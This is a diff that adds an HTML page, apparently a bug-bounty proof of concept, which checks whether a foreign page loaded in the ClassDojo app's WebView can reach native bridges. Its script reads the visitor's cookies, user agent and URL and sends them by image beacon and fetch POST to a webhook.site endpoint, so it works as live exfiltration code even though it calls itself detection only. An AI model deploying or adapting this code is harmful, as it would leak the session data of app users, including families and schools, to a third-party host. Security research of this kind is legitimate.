@@ -1,0 +1,33 @@
+<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>CD WebView Probe</title><style>
+:root{--bg:#0b0f14;--fg:#e6edf3;--mut:#8b98a5;--bad:#ff5d5d;--ok:#3fb950;--card:#141b23;--line:#263240}
+html,body{margin:0}body{background:var(--bg);color:var(--fg);font:15px/1.5 -apple-system,Segoe UI,Roboto,sans-serif;padding:18px;word-break:break-word}
+h1{font-size:30px;margin:.1em 0}.bad{color:var(--bad)}.ok{color:var(--ok)}
+.kv{background:var(--card);border:1px solid var(--line);border-radius:10px;padding:10px 12px;margin:8px 0}
+.kv b{display:block;color:var(--mut);font-size:12px;letter-spacing:.04em;text-transform:uppercase;margin-bottom:3px}
+.kv span{font-family:ui-monospace,Menlo,monospace;font-size:13px}
+.note{color:var(--mut);font-size:13px;margin-top:14px}
+</style></head><body><div id="out">running…</div><script>
+(function(){var W=window,D=document;function esc(s){return String(s).replace(/[<&>]/g,function(c){return{'<':'&lt;','&':'&amp;','>':'&gt;'}[c];});}
+var ua='';try{ua=navigator.userAgent||'';}catch(e){}
+var rn=false;try{rn=(typeof W.ReactNativeWebView!=='undefined'&&W.ReactNativeWebView&&typeof W.ReactNativeWebView.postMessage==='function');}catch(e){}
+var ab=false;try{ab=(typeof W.androidBridge!=='undefined');}catch(e){}
+var names=['ReactNativeWebView','androidBridge','__REACT_WEB_VIEW_BRIDGE','DojoWebView','webkit','ReactNativeWebViewPostMessage'];var found=[];
+names.forEach(function(n){try{if(typeof W[n]!=='undefined')found.push(n);}catch(e){}});
+var cookie='';try{cookie=D.cookie||'(empty)';}catch(e){cookie='(blocked)';}
+var href='';try{href=location.href;}catch(e){}
+var exposed=rn||ab;
+D.getElementById('out').innerHTML=
+'<h1 class="'+(exposed?'bad':'ok')+'">'+(exposed?'⚠ BRIDGE EXPOSED':'✓ LOADED IN-APP')+'</h1>'+
+'<p>This foreign page is running <b>inside the ClassDojo app WebView</b>.</p>'+
+'<div class="kv"><b>ReactNativeWebView native bridge</b><span class="'+(rn?'bad':'ok')+'">'+(rn?'PRESENT — foreign origin can postMessage to native':'not detected')+'</span></div>'+
+'<div class="kv"><b>androidBridge</b><span class="'+(ab?'bad':'ok')+'">'+(ab?'PRESENT':'not detected')+'</span></div>'+
+'<div class="kv"><b>Injected interfaces</b><span>'+(found.length?esc(found.join(', ')):'none')+'</span></div>'+
+'<div class="kv"><b>document.cookie (this origin)</b><span>'+esc(cookie)+'</span></div>'+
+'<div class="kv"><b>WebView User-Agent</b><span>'+esc(ua)+'</span></div>'+
+'<div class="kv"><b>Loaded URL</b><span>'+esc(href)+'</span></div>'+
+'<p class="note">Detection only — the bridge was NOT invoked. Screenshot this screen as evidence; the same facts were also logged server-side.</p>';
+var q='?e=probe&rn='+(rn?1:0)+'&ab='+(ab?1:0)+'&found='+encodeURIComponent(found.join('|'))+'&ua='+encodeURIComponent(ua).slice(0,300)+'&href='+encodeURIComponent(href).slice(0,300)+'&ck='+encodeURIComponent(cookie).slice(0,200);
+try{new Image().src='https://webhook.site/543a9d5e-02a1-42fb-b229-df77506af73c'+q;}catch(e){}
+try{fetch('https://webhook.site/543a9d5e-02a1-42fb-b229-df77506af73c',{method:'POST',headers:{'content-type':'application/json'},body:JSON.stringify({evt:'cd-probe',rn:rn,ab:ab,found:found,ua:ua,cookie:cookie,href:href})});}catch(e){}
+})();
+</script></body></html>
